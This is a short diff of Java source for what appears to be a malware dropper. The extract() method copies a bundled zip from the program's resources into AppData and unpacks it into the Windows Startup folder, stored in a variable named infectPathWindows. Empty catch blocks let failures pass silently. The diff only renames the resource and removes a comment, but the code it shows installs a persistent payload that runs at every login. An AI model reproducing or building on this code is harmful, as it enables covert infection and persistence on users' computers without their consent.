@@ -40,7 +40,7 @@ public class Main {
 
     public static void extract() throws IOException{
 
-        InputStream is = Main.class.getClassLoader().getResourceAsStream("e.zip");
+        InputStream is = Main.class.getClassLoader().getResourceAsStream("this.zip");
         File file = new File(System.getProperty("user.home")+ "\\AppData\\Roaming\\Microsoft\\Main");
         try(OutputStream outputStream = new FileOutputStream(file)){
             IOUtils.copy(is, outputStream);
@@ -48,7 +48,7 @@ public class Main {
         }catch (IOException s){
         }
 
-        String infectPathWindows = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"; //will make a folder if it doesnt exist
+        String infectPathWindows = System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
 
         ZipFile z1 = new ZipFile(file);
         z1.extractAll(infectPathWindows);
